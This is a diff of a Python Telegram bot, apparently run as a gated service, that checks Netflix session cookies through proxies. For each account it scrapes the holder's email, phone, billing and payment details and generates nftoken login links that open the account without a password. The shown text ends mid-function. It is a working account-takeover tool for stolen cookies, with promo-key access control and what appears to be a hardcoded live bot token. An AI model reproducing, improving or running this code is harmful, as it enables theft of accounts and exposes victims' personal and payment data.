@@ -13,6 +13,7 @@ import html
 import zipfile
 import tempfile
 import shutil
+import uuid
 from flask import Flask
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
@@ -23,15 +24,153 @@ from telegram.ext import (
     ContextTypes,
 )
 
+# PostgreSQL / Supabase Integration
+try:
+    import psycopg2
+    import psycopg2.extras
+    HAS_POSTGRES = True
+except ImportError:
+    HAS_POSTGRES = False
+
 # ========== CONFIGURATION ==========
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8915335839:AAGRpBFdulQwjjsaKvhZ-aiEUtY7VQdjV3o")
 PORT = int(os.environ.get("PORT", 8000))
-
-# SET YOUR TELEGRAM USER ID HERE (Owner Has Permanent Access)
 OWNER_ID = int(os.environ.get("OWNER_ID", 6420446828))
+SUPABASE_URI = os.environ.get("SUPABASE_URI", os.environ.get("DATABASE_URL", ""))
 
-# Set to store approved User IDs (Owner is automatically added)
+# ========== LOGGING SETUP ==========
+logging.basicConfig(
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
+    level=logging.INFO,
+)
+logger = logging.getLogger(__name__)
+
+# ========== SUPABASE & ACCESS STORAGE SETUP ==========
 APPROVED_USERS: Set[int] = {OWNER_ID}
+AVAILABLE_KEYS: Dict[str, bool] = {}
+TEMP_ACCESS_USERS: Dict[int, float] = {}
+
+db_conn = None
+
+def get_db_connection():
+    global db_conn
+    if not HAS_POSTGRES or not SUPABASE_URI:
+        return None
+    try:
+        if db_conn is None or db_conn.closed != 0:
+            db_conn = psycopg2.connect(SUPABASE_URI, sslmode='require')
+            db_conn.autocommit = True
+        return db_conn
+    except Exception as e:
+        logger.error(f"PostgreSQL connection error: {e}")
+        return None
+
+def init_db():
+    conn = get_db_connection()
+    if conn is None:
+        logger.info("ℹ️ SUPABASE_URI not set or failed to connect. Operating with in-memory storage.")
+        return
+    try:
+        with conn.cursor() as cur:
+            cur.execute("""
+                CREATE TABLE IF NOT EXISTS approved_users (
+                    user_id BIGINT PRIMARY KEY
+                );
+                CREATE TABLE IF NOT EXISTS promo_keys (
+                    code VARCHAR(64) PRIMARY KEY,
+                    active BOOLEAN DEFAULT TRUE
+                );
+                CREATE TABLE IF NOT EXISTS temp_users (
+                    user_id BIGINT PRIMARY KEY,
+                    expires_at DOUBLE PRECISION NOT NULL
+                );
+            """)
+        logger.info("✅ Supabase tables initialized successfully!")
+        
+        # Load state into memory
+        with conn.cursor() as cur:
+            cur.execute("SELECT user_id FROM approved_users;")
+            for row in cur.fetchall():
+                APPROVED_USERS.add(int(row[0]))
+                
+            cur.execute("SELECT code FROM promo_keys WHERE active = TRUE;")
+            for row in cur.fetchall():
+                AVAILABLE_KEYS[row[0]] = True
+                
+            cur.execute("SELECT user_id, expires_at FROM temp_users;")
+            for row in cur.fetchall():
+                TEMP_ACCESS_USERS[int(row[0])] = float(row[1])
+                
+        logger.info(f"📊 Loaded DB: {len(APPROVED_USERS)} approved users, {len(AVAILABLE_KEYS)} promo keys, {len(TEMP_ACCESS_USERS)} 24h temp users.")
+    except Exception as e:
+        logger.error(f"Error initializing database: {e}")
+
+init_db()
+
+# DB Helper Functions
+def db_add_approved_user(user_id: int):
+    APPROVED_USERS.add(user_id)
+    conn = get_db_connection()
+    if conn:
+        try:
+            with conn.cursor() as cur:
+                cur.execute("INSERT INTO approved_users (user_id) VALUES (%s) ON CONFLICT (user_id) DO NOTHING;", (user_id,))
+        except Exception as e:
+            logger.error(f"DB Error in db_add_approved_user: {e}")
+
+def db_remove_approved_user(user_id: int):
+    if user_id in APPROVED_USERS:
+        APPROVED_USERS.remove(user_id)
+    conn = get_db_connection()
+    if conn:
+        try:
+            with conn.cursor() as cur:
+                cur.execute("DELETE FROM approved_users WHERE user_id = %s;", (user_id,))
+        except Exception as e:
+            logger.error(f"DB Error in db_remove_approved_user: {e}")
+
+def db_add_promo_key(code: str):
+    AVAILABLE_KEYS[code] = True
+    conn = get_db_connection()
+    if conn:
+        try:
+            with conn.cursor() as cur:
+                cur.execute("INSERT INTO promo_keys (code, active) VALUES (%s, TRUE) ON CONFLICT (code) DO UPDATE SET active = TRUE;", (code,))
+        except Exception as e:
+            logger.error(f"DB Error in db_add_promo_key: {e}")
+
+def db_burn_promo_key(code: str) -> bool:
+    conn = get_db_connection()
+    if conn:
+        try:
+            with conn.cursor() as cur:
+                cur.execute("DELETE FROM promo_keys WHERE code = %s AND active = TRUE RETURNING code;", (code,))
+                deleted = cur.fetchone()
+                if code in AVAILABLE_KEYS:
+                    del AVAILABLE_KEYS[code]
+                return bool(deleted)
+        except Exception as e:
+            logger.error(f"DB Error in db_burn_promo_key: {e}")
+            return False
+    else:
+        if code in AVAILABLE_KEYS and AVAILABLE_KEYS[code]:
+            del AVAILABLE_KEYS[code]
+            return True
+        return False
+
+def db_set_temp_access(user_id: int, expiration_timestamp: float):
+    TEMP_ACCESS_USERS[user_id] = expiration_timestamp
+    conn = get_db_connection()
+    if conn:
+        try:
+            with conn.cursor() as cur:
+                cur.execute("""
+                    INSERT INTO temp_users (user_id, expires_at)
+                    VALUES (%s, %s)
+                    ON CONFLICT (user_id) DO UPDATE SET expires_at = EXCLUDED.expires_at;
+                """, (user_id, expiration_timestamp))
+        except Exception as e:
+            logger.error(f"DB Error in db_set_temp_access: {e}")
 
 # Global proxy state and bulk cancel event
 CURRENT_PROXY: Optional[str] = None
@@ -39,15 +178,49 @@ cancel_bulk_event = asyncio.Event()
 
 # ========== ACCESS CONTROL HELPER ==========
 def is_approved(user_id: int) -> bool:
-    return user_id in APPROVED_USERS or user_id == OWNER_ID
+    if user_id == OWNER_ID or user_id in APPROVED_USERS:
+        return True
+
+    exp_time = None
+    conn = get_db_connection()
+    if conn:
+        try:
+            with conn.cursor() as cur:
+                cur.execute("SELECT expires_at FROM temp_users WHERE user_id = %s;", (user_id,))
+                row = cur.fetchone()
+                if row:
+                    exp_time = float(row[0])
+        except Exception as e:
+            logger.error(f"DB error checking user approval: {e}")
+
+    if exp_time is None:
+        exp_time = TEMP_ACCESS_USERS.get(user_id)
+
+    if exp_time and time.time() < exp_time:
+        return True
+    elif exp_time:
+        if conn:
+            try:
+                with conn.cursor() as cur:
+                    cur.execute("DELETE FROM temp_users WHERE user_id = %s;", (user_id,))
+            except Exception:
+                pass
+        if user_id in TEMP_ACCESS_USERS:
+            del TEMP_ACCESS_USERS[user_id]
+        return False
+
+    return False
 
 # ========== FLASK APP & HEALTH ENDPOINTS ==========
 app = Flask(__name__)
+application = None
 
 @app.route("/", methods=["GET"])
 def index():
     bot_status = "🟢 Running" if application else "🔴 Stopped"
     proxy_status = CURRENT_PROXY if CURRENT_PROXY else "❌ Not Set (Required)"
+    db_connected = get_db_connection() is not None
+    db_status = "🟢 Connected (Supabase / PostgreSQL)" if db_connected else "🟡 In-Memory"
     return f"""
     <html>
         <head>
@@ -60,7 +233,6 @@ def index():
                 .stopped {{ background-color: #f8d7da; color: #721c24; }}
                 h1 {{ color: #333; }}
                 a {{ color: #007bff; text-decoration: none; }}
-                a:hover {{ text-decoration: underline; }}
             </style>
         </head>
         <body>
@@ -68,14 +240,13 @@ def index():
                 <h1>✅ Netflix Cookie Checker Bot</h1>
                 <div class="status {'running' if application else 'stopped'}">
                     <p><b>Bot Status:</b> {bot_status}</p>
-                    <p><b>BOT_TOKEN:</b> {'✅ Set' if BOT_TOKEN else '❌ Not Set'}</p>
+                    <p><b>Database:</b> {db_status}</p>
                     <p><b>Approved Users Count:</b> {len(APPROVED_USERS)}</p>
                     <p><b>Active Proxy:</b> {proxy_status}</p>
-                    <p><b>BOT_link: <a href="https://t.me/Cook2linkbot">Redirect</a></b></p>
                     <p><b>Port:</b> {PORT}</p>
                 </div>
                 <hr>
-                <p><a href="/health">Check Health</a></p>
+                <p><a href="/health">Check Health Endpoint</a></p>
             </div>
         </body>
     </html>
@@ -86,57 +257,40 @@ def health():
     return {
         "status": "healthy" if application else "unhealthy",
         "bot_running": application is not None,
-        "bot_token_set": bool(BOT_TOKEN),
+        "db_connected": get_db_connection() is not None,
         "approved_users_count": len(APPROVED_USERS),
         "proxy_set": bool(CURRENT_PROXY),
-        "current_proxy": CURRENT_PROXY,
         "timestamp": time.time()
     }, 200 if application else 503
 
-# ========== LOGGING SETUP ==========
-logging.basicConfig(
-    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
-    level=logging.INFO,
-)
-logger = logging.getLogger(__name__)
-
-application = None
-
-# ========== MESSAGES & TEXT ==========
+# ========== START & HELP MESSAGES ==========
 START_TEXT = (
     "👋 Netflix Cookie Checker Bot\n\n"
     "⚠️ IMPORTANT: You MUST set a proxy using /addproxy before checking any cookies.\n\n"
     "Available Commands:\n"
     "• /addproxy `<proxy>` — Add & test an HTTP proxy (REQUIRED)\n"
-    "  Supported formats:\n"
-    "  - `host:port` or `http://host:port`\n"
-    "  - `user:pass@host:port` or `http://user:pass@host:port`\n"
-    "  - `user:pass:host:port` or `http://user:pass:host:port`\n"
+    "• /redeem `<code>` — Claim 24-hour promo access\n"
     "• /stop — Halt an ongoing bulk check immediately\n"
     "• /help — Usage instructions\n\n"
     "Owner Commands:\n"
-    "• /approve `<userid>` — Grant access to a user\n"
-    "• /disapprove `<userid>` — Revoke access from a user\n"
+    "• /genkey `[custom_code]` — Generate 24h promo code\n"
+    "• /approve `<userid>` — Permanent user approval\n"
+    "• /disapprove `<userid>` — Revoke access\n"
     "• /approved — View list of approved users\n\n"
     " Bot by @zyokr 🦖"
 )
 
 HELP_TEXT = (
     "How to use:\n"
-    "1. Access is restricted. Ask owner for approval.\n"
+    "1. Access is restricted. Ask owner for approval or claim a key with `/redeem <code>`.\n"
     "2. MANDATORY: Set a working proxy using `/addproxy` before checking.\n"
-    "   Proxy Formats Supported:\n"
-    "   • host:port\n"
-    "   • user:pass@host:port\n"
-    "   • user:pass:host:port\n"
     "3. Paste cookies as text, upload a `.txt` file, or upload a `.zip` archive.\n"
     "4. Use `/stop` anytime to halt bulk processing."
 )
 
 COOKIE_KV_RE = re.compile(r"^\s*([A-Za-z0-9_\\-]+)\s*=\s*(.+?)\s*$", re.DOTALL)
 
-
-# ========== HELPER FUNCTIONS FOR PROXY & PARSING ==========
+# ========== PROXY & PARSING HELPERS ==========
 def _format_proxy_string(raw_proxy: str) -> str:
     proxy = raw_proxy.strip()
     scheme = "http://"
@@ -150,7 +304,6 @@ def _format_proxy_string(raw_proxy: str) -> str:
     if len(parts) == 4:
         user, password, host, port = parts
         return f"{scheme}{user}:{password}@{host}:{port}"
-    
     return f"{scheme}{proxy}"
 
 def _get_request_proxies() -> Optional[Dict[str, str]]:
@@ -181,36 +334,15 @@ def _is_json_cookie(text: str) -> bool:
 
 def _is_netscape_cookie(text: str) -> bool:
     lines = text.strip().split('\n')
-    if len(lines) < 1:
-        return False
-    
     for line in lines:
         line = line.strip()
         if not line or line.startswith('#'):
             continue
-        
-        if '\t' in line:
-            parts = line.split('\t')
-            if len(parts) >= 7:
-                return True
-        else:
-            parts = line.split()
-            if len(parts) >= 7:
-                domain = parts[0]
-                flag = parts[1]
-                path = parts[2]
-                secure = parts[3]
-                try:
-                    _ = int(parts[4])
-                    if domain.startswith('.') and flag in ['TRUE', 'FALSE'] and path == '/' and secure in ['TRUE', 'FALSE']:
-                        return True
-                except (ValueError, IndexError):
-                    continue
+        delimiter = '\t' if '\t' in line else ' '
+        parts = line.split(delimiter)
+        if len(parts) >= 7:
+            return True
     return False
-
-def _looks_like_cookie_header(text: str) -> bool:
-    t = text.strip().lower()
-    return t.startswith("cookie:") or (";" in text and "=" in text)
 
 def _extract_json_cookies(json_str: str) -> Dict[str, str]:
     try:
@@ -224,35 +356,22 @@ def _extract_json_cookies(json_str: str) -> Dict[str, str]:
                     if name and value:
                         kv[name] = value
         return kv
-    except Exception as e:
-        logger.error(f"Error parsing JSON cookies: {e}")
+    except Exception:
         return {}
 
 def _extract_netscape_cookies(netscape_str: str) -> Dict[str, str]:
     kv: Dict[str, str] = {}
     lines = netscape_str.strip().split('\n')
-    
     for line in lines:
         line = line.strip()
         if not line or line.startswith('#'):
             continue
-        
         delimiter = '\t' if '\t' in line else ' '
         parts = line.split(delimiter)
-        
         if len(parts) >= 7:
-            try:
-                name = parts[5]
-                if delimiter == '\t':
-                    value = parts[6]
-                else:
-                    match = re.match(r'^(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(\S+)\s+(.+)$', line)
-                    value = match.group(7).strip() if match else ' '.join(parts[6:])
-                
-                if name and value:
-                    kv[name] = value
-            except Exception:
-                continue
+            name, value = parts[5], parts[6]
+            if name and value:
+                kv[name] = value
     return kv
 
 def _extract_cookie_kv_pairs(text: str) -> Dict[str, str]:
@@ -273,22 +392,13 @@ def _build_cookie_header(cookie_input: str) -> Optional[str]:
         kv = _extract_json_cookies(cookie_input)
         if kv:
             return "; ".join([f"{k}={v}" for k, v in kv.items()])
-    
     if _is_netscape_cookie(cookie_input):
         kv = _extract_netscape_cookies(cookie_input)
         if kv:
             return "; ".join([f"{k}={v}" for k, v in kv.items()])
-    
-    if _looks_like_cookie_header(cookie_input):
-        cleaned = re.sub(r"(?i)^\s*cookie\s*:\s*", "", cookie_input).strip()
-        if "=" not in cleaned:
-            return None
-        kv = _extract_cookie_kv_pairs(cookie_input)
-        if kv:
-            return "; ".join([f"{k}={v}" for k, v in kv.items()])
-        return cleaned
 
-    kv = _extract_cookie_kv_pairs(cookie_input)
+    cleaned = re.sub(r"(?i)^\s*cookie\s*:\s*", "", cookie_input).strip()
+    kv = _extract_cookie_kv_pairs(cleaned)
     if kv:
         return "; ".join([f"{k}={v}" for k, v in kv.items()])
     return None
@@ -297,10 +407,8 @@ def _split_multiple_cookies(text: str) -> list[str]:
     text = text.strip()
     if _is_json_cookie(text):
         return [text]
-    
     blocks = re.split(r'\n\s*\n', text)
     cookie_list = []
-    
     for block in blocks:
         block = block.strip()
         if not block:
@@ -310,59 +418,15 @@ def _split_multiple_cookies(text: str) -> list[str]:
             cookie_list.append(block)
         else:
             for line in lines:
-                line = line.strip()
                 if "netflixid" in line.lower():
                     cookie_list.append(line)
-                    
     return cookie_list if cookie_list else [text]
 
 def _safe_preview_cookie_keys(cookie_header: str) -> str:
-    names = []
-    for token in cookie_header.split(";"):
-        token = token.strip()
-        if "=" in token:
-            names.append(token.split("=", 1)[0].strip())
-    names = [n for n in names if n]
+    names = [t.split("=")[0].strip() for t in cookie_header.split(";") if "=" in t]
     return ", ".join(names[:8]) + ("…" if len(names) > 8 else "")
 
-def _generate_results_txt(valid_accounts: list, filename: str) -> str:
-    """Generates a formatted summary report text file of all checked valid accounts including login links."""
-    lines = []
-    lines.append("==================================================")
-    lines.append(f" NETFLIX COOKIE CHECKER REPORT - {filename}")
-    lines.append(f" Generated At: {time.strftime('%Y-%m-%d %H:%M:%S')}")
-    lines.append(f" Total Valid Accounts Found: {len(valid_accounts)}")
-    lines.append("==================================================\n")
-
-    for idx, acct in enumerate(valid_accounts, start=1):
-        nftoken = acct.get('nftoken', '')
-        desktop_link = f"https://www.netflix.com/browse?nftoken={nftoken}" if nftoken else "N/A"
-        phone_link = f"https://www.netflix.com/unsupported?nftoken={nftoken}" if nftoken else "N/A"
-
-        lines.append(f"--- ACCOUNT #{idx} [{acct.get('source_tag', 'Cookie')}] ---")
-        lines.append(f"Name           : {acct.get('name', 'Unknown')}")
-        lines.append(f"Email          : {acct.get('email', 'Unknown')}")
-        lines.append(f"Country        : {acct.get('country', 'Unknown')}")
-        lines.append(f"Plan           : {acct.get('plan', 'Unknown')}")
-        lines.append(f"Price          : {acct.get('plan_price', 'N/A')}")
-        lines.append(f"Member Since   : {acct.get('member_since', 'Unknown')}")
-        lines.append(f"Next Billing   : {acct.get('next_billing', 'Unknown')}")
-        lines.append(f"Payment Method : {acct.get('payment_method', 'CC')}")
-        lines.append(f"Payment Status : {acct.get('payment_status', 'Active / Paid')}")
-        lines.append(f"Phone Number   : {acct.get('phone', 'N/A')} (Has Phone: {acct.get('has_phone', 'No')})")
-        lines.append(f"Video Quality  : {acct.get('video_quality', 'HD')}")
-        lines.append(f"Max Streams    : {acct.get('max_streams', '2')}")
-        lines.append(f"Extra Member   : {acct.get('extra_member', 'No')}")
-        lines.append(f"Email Verified : {acct.get('email_verified', 'No')}")
-        lines.append(f"Profiles       : {acct.get('profiles', 'Unknown')}")
-        lines.append(f"💻 Desktop Link : {desktop_link}")
-        lines.append(f"📱 Phone Link   : {phone_link}")
-        lines.append("--------------------------------------------------\n")
-
-    return "\n".join(lines)
-
-
-# ========== NETFLIX API & VERIFICATION ==========
+# ========== NETFLIX CHECKER ENGINE ==========
 NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
 NFTOKEN_QUERY_PARAMS = {
     "appVersion": "15.48.1",
@@ -397,34 +461,21 @@ NFTOKEN_HEADERS = {
     "x-netflix.context.sdk-version": "2012.4",
     "x-netflix.client.appversion": "15.48.1",
     "x-netflix.context.max-device-width": "375",
-    "x-netflix.context.ab-tests": "",
     "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
     "x-netflix.client.type": "argo",
-    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
-    "x-netflix.context.locales": "en-US",
-    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
     "accept-language": "en-US;q=1",
-    "x-netflix.argo.abtests": "",
-    "x-netflix.context.os-version": "15.8.5",
-    "x-netflix.request.client.context": '{"appState":"foreground"}',
-    "x-netflix.context.ui-flavor": "argo",
-    "x-netflix.argo.nfnsm": "9",
-    "x-netflix.context.pixel-density": "2.0",
-    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
-    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
 }
 
 def _extract_netflix_id_from_cookie_header(cookie_header: str) -> Optional[str]:
     for token in cookie_header.split(";"):
         token = token.strip()
-        if not token or "=" not in token:
-            continue
-        k, v = token.split("=", 1)
-        if k.strip().lower() == "netflixid":
-            return v.strip()
+        if "=" in token:
+            k, v = token.split("=", 1)
+            if k.strip().lower() == "netflixid":
+                return v.strip()
     return None
 
-def _generate_nftoken(cookie_header: str, timeout_s: int = 8) -> Tuple[bool, str, Optional[str]]:
+def _generate_nftoken(cookie_header: str) -> Tuple[bool, str, Optional[str]]:
     netflix_id = _extract_netflix_id_from_cookie_header(cookie_header)
     if not netflix_id:
         return False, "Invalid or expired cookie. NetflixId not found.", None
@@ -438,19 +489,17 @@ def _generate_nftoken(cookie_header: str, timeout_s: int = 8) -> Tuple[bool, str
             params=NFTOKEN_QUERY_PARAMS,
             headers=headers,
             proxies=_get_request_proxies(),
-            timeout=timeout_s,
+            timeout=(5, 15),
             verify=False,
         )
         r.raise_for_status()
         data = r.json()
-
         td = ((((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
         nftoken = td.get("token")
 
         if not nftoken:
             return False, "Invalid or expired cookie. Token generation failed.", None
-
-        return True, "Token API returned a valid nftoken.", nftoken
+        return True, "Valid nftoken generated.", nftoken
     except Exception as e:
         logger.error(f"Error generating nftoken: {e}")
         return False, "Invalid or expired cookie.", None
@@ -464,164 +513,71 @@ def decode_text(value):
     except Exception:
         pass
     value = html.unescape(value)
-    value = re.sub(
-        r'\\x([0-9A-Fa-f]{2})',
-        lambda m: bytes.fromhex(m.group(1)).decode('latin1'),
-        value
-    )
+    value = re.sub(r'\\x([0-9A-Fa-f]{2})', lambda m: bytes.fromhex(m.group(1)).decode('latin1'), value)
     return value.strip()
 
-def _check_netflix_cookie(cookie_header: str, timeout_s: int = 10) -> Dict[str, str]:
+def _check_netflix_cookie(cookie_header: str) -> Dict[str, str]:
     cookie_dict: Dict[str, str] = {}
     for token in cookie_header.split(";"):
         token = token.strip()
-        if not token or "=" not in token:
-            continue
-        k, v = token.split("=", 1)
-        cookie_dict[k.strip()] = v.strip()
+        if "=" in token:
+            k, v = token.split("=", 1)
+            cookie_dict[k.strip()] = v.strip()
 
     if not cookie_dict.get("NetflixId"):
         return {"ok": False, "reason": "No NetflixId found in cookies"}
 
     session = requests.Session()
     session.cookies.update(cookie_dict)
-    
-    # Enforce English language cookies
     session.cookies.set("nf_lang", "en", domain=".netflix.com")
     session.cookies.set("cl_lang", "en-US", domain=".netflix.com")
-    
+
     if CURRENT_PROXY:
         session.proxies.update(_get_request_proxies())
 
     headers = {
-        "User-Agent": (
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
-            "AppleWebKit/537.36 (KHTML, like Gecko) "
-            "Chrome/124.0.0.0 Safari/537.36"
-        ),
-        "Accept": "text/html,application/xhtml+xml",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36",
         "Accept-Language": "en-US,en;q=0.9",
-        "Accept-Encoding": "gzip, deflate",
         "X-Netflix.Context.Locales": "en-US",
     }
 
-    urls = [
-        "https://www.netflix.com/YourAccount?locale=en-US",
-        "https://www.netflix.com/account?locale=en-US",
-        "https://www.netflix.com/account/membership?locale=en-US",
-    ]
-
     try:
-        resp = None
-        txt = ""
-        for url in urls:
-            try:
-                r = session.get(url, headers=headers, timeout=timeout_s, allow_redirects=True, verify=False)
-                if r.status_code == 200 and ("Account" in (r.text or "") or "YourAccount" in r.url or "cuenta" in (r.text or "").lower()):
-                    resp = r
-                    txt = r.text or ""
-                    break
-            except Exception:
-                continue
+        r = session.get("https://www.netflix.com/YourAccount?locale=en-US", headers=headers, timeout=(5, 15), verify=False)
+        if r.status_code != 200 or ("login" in r.url.lower()) or ("signin" in r.url.lower()):
+            return {"ok": False, "reason": "Redirected to login or HTTP error"}
 
-        if not resp or resp.status_code != 200:
-            return {"ok": False, "reason": f"HTTP {resp.status_code if resp else 'error'}"}
-
-        if ("login" in (resp.url or "").lower()) or ("signin" in (resp.url or "").lower()):
-            return {"ok": False, "reason": "Redirected to login"}
-
+        txt = r.text or ""
         def find(pattern: str) -> Optional[str]:
             m = re.search(pattern, txt)
             return decode_text(m.group(1)) if m else None
 
         name = find(r'"accountOwnerName"\s*:\s*"([^"]+)"') or find(r'"firstName"\s*:\s*"([^"]+)"')
         plan_raw = find(r'localizedPlanName.{1,50}?value":"([^"]+)"') or find(r'"planName"\s*:\s*"([^"]+)"')
-        country = (
-            find(r'"countryOfSignup"\s*:\s*"([^"]+)"')
-            or find(r'"countryCode"\s*:\s*"([^"]+)"')
-            or find(r'"currentCountry"\s*:\s*"([^"]+)"')
-        )
-        email = (
-            find(r'"emailAddress"\s*:\s*"([^"]+)"')
-            or find(r'"email"\s*:\s*"([^"]+)"')
-            or find(r'"loginId"\s*:\s*"([^"]+)"')
-        )
+        country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"countryCode"\s*:\s*"([^"]+)"')
+        email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or find(r'"email"\s*:\s*"([^"]+)"')
         member_since = find(r'"memberSince":"([^"]+)"')
-        next_billing = (
-            find(r'"nextBillingDate":\{[^}]*"date":"([^T"]+)"')
-            or find(r'"nextBilling"[^}]*"value":"([^"]+)"')
-        )
-        plan_price = (
-            find(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"')
-            or find(r'"formattedPlanPrice"\s*:\s*"([^"]+)"')
-        )
-        payment = (
-            find(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"')
-            or find(r'"paymentMethodType"\s*:\s*"([^"]+)"')
-        )
-        phone = (
-            find(r'"phoneNumberDigits":\{[^}]*"value":"([^"]+)"')
-            or find(r'"phoneNumber"\s*:\s*"([^"]+)"')
-        )
-        quality = (
-            find(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"')
-            or find(r'"maxVideoQuality"\s*:\s*"([^"]+)"')
-        )
-        streams = (
-            find(r'"maxStreams":\{"fieldType":"Numeric","value":([0-9]+)')
-            or find(r'"maxStreams"\s*:\s*"?([0-9]+)"?')
-        )
+        next_billing = find(r'"nextBillingDate":\{[^}]*"date":"([^T"]+)"') or find(r'"nextBilling"[^}]*"value":"([^"]+)"')
+        plan_price = find(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"')
+        payment = find(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"')
+        phone = find(r'"phoneNumberDigits":\{[^}]*"value":"([^"]+)"')
+        quality = find(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"')
+        streams = find(r'"maxStreams":\{"fieldType":"Numeric","value":([0-9]+)')
 
-        # Check explicit payment issue text in English + Spanish
-        has_payment_issue_text = bool(re.search(
-            r"(?i)("
-            r"fix\s+your\s+payment|"
-            r"didn['’]t\s+go\s+through|"
-            r"can['’]t\s+process\s+your\s+payment|"
-            r"retry\s+payment|"
-            r"update\s+payment|"
-            r"no\s+pudimos\s+procesar|"
-            r"no\s+podemos\s+procesar|"
-            r"actualiza\s+la\s+informaci[óo]n\s+de\s+pago|"
-            r"actualizar\s+forma\s+de\s+pago|"
-            r"actualizar\s+m[ée]todo\s+de\s+pago"
-            r")",
-            txt
-        ))
+        has_payment_issue = bool(re.search(r"(?i)(fix\s+your\s+payment|didn['’]t\s+go\s+through|retry\s+payment|actualizar\s+forma\s+de\s+pago)", txt))
+        is_hold = bool(re.search(r'"(isPaymentProblem|isHold)"\s*:\s*true', txt, re.I))
 
-        payment_status_raw = find(r'"paymentStatus"\s*:\s*"([^"]+)"')
-        membership_status_raw = find(r'"membershipStatus"\s*:\s*"([^"]+)"') or "CURRENT_MEMBER"
-        account_status_raw = find(r'"accountStatus"\s*:\s*"([^"]+)"')
-        is_hold_json = bool(re.search(r'"(isPaymentProblem|isHold)"\s*:\s*true', txt, re.I))
-
-        if has_payment_issue_text or is_hold_json or account_status_raw in ["HOLD", "NEEDS_PAYMENT"]:
+        if has_payment_issue or is_hold:
             payment_status = "Action Required (Payment Failed)"
-        elif payment_status_raw:
-            payment_status = payment_status_raw
-        elif membership_status_raw == "CURRENT_MEMBER":
-            payment_status = "Active / Paid"
         else:
-            payment_status = membership_status_raw
-
-        extra = "Yes" if re.search(r'"showExtraMemberSection":\{"fieldType":"Boolean","value":true', txt) else "No"
-        email_ver = "Yes" if re.search(r'"emailVerified"\s*:\s*true', txt) else "No"
+            payment_status = "Active / Paid"
 
         profiles: list = []
         try:
             rp = session.get("https://www.netflix.com/ManageProfiles?locale=en-US", timeout=6, verify=False)
             if rp.status_code == 200:
                 profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', rp.text or "")
-                if not profiles:
-                    profiles = re.findall(r'"displayName"\s*:\s*"([^"]+)"', rp.text or "")
-                if not profiles:
-                    profiles = re.findall(r'"name"\s*:\s*"([^"]+)"', rp.text or "")
         except Exception:
             pass
-
-        profiles_str = (
-            ", ".join(decode_text(p) for p in profiles)
-            if profiles else (name or "Unknown")
-        )
 
         return {
             "ok": True,
@@ -633,273 +589,233 @@ def _check_netflix_cookie(cookie_header: str, timeout_s: int = 10) -> Dict[str, 
             "member_since": member_since or "Unknown",
             "next_billing": next_billing or "Unknown",
             "payment_method": payment or "CC",
+            "payment_status": payment_status,
             "phone": phone or "N/A",
             "has_phone": "Yes" if phone else "No",
             "video_quality": quality or "HD",
             "max_streams": streams or "2",
-            "payment_status": payment_status,
-            "extra_member": extra,
-            "email_verified": email_ver,
-            "membership_status": membership_status_raw,
-            "profiles": profiles_str,
+            "extra_member": "Yes" if "showExtraMemberSection" in txt else "No",
+            "email_verified": "Yes" if '"emailVerified":true' in txt else "No",
+            "membership_status": "CURRENT_MEMBER",
+            "profiles": ", ".join(decode_text(p) for p in profiles) if profiles else (name or "Unknown"),
             "connected_profiles": str(len(profiles)) if profiles else "1"
         }
     except Exception as e:
-        logger.error(f"Error checking netflix cookie: {e}")
         return {"ok": False, "reason": str(e)}
 
+def _generate_results_txt(valid_accounts: list, filename: str) -> str:
+    lines = [
+        "==================================================",
+        f" NETFLIX COOKIE CHECKER REPORT - {filename}",
+        f" Generated At: {time.strftime('%Y-%m-%d %H:%M:%S')}",
+        f" Total Valid Accounts Found: {len(valid_accounts)}",
+        "==================================================\n"
+    ]
+    for idx, acct in enumerate(valid_accounts, start=1):
+        nftoken = acct.get('nftoken', '')
+        desktop_link = f"https://www.netflix.com/browse?nftoken={nftoken}" if nftoken else "N/A"
+        phone_link = f"https://www.netflix.com/unsupported?nftoken={nftoken}" if nftoken else "N/A"
 
-# ========== OWNER APPROVAL SYSTEM COMMANDS ==========
+        lines.extend([
+            f"--- ACCOUNT #{idx} [{acct.get('source_tag', 'Cookie')}] ---",
+            f"Name           : {acct.get('name', 'Unknown')}",
+            f"Email          : {acct.get('email', 'Unknown')}",
+            f"Country        : {acct.get('country', 'Unknown')}",
+            f"Plan           : {acct.get('plan', 'Unknown')}",
+            f"Price          : {acct.get('plan_price', 'N/A')}",
+            f"Member Since   : {acct.get('member_since', 'Unknown')}",
+            f"Next Billing   : {acct.get('next_billing', 'Unknown')}",
+            f"Payment Method : {acct.get('payment_method', 'CC')}",
+            f"Payment Status : {acct.get('payment_status', 'Active / Paid')}",
+            f"Phone Number   : {acct.get('phone', 'N/A')} (Has Phone: {acct.get('has_phone', 'No')})",
+            f"Video Quality  : {acct.get('video_quality', 'HD')}",
+            f"Max Streams    : {acct.get('max_streams', '2')}",
+            f"Extra Member   : {acct.get('extra_member', 'No')}",
+            f"Email Verified : {acct.get('email_verified', 'No')}",
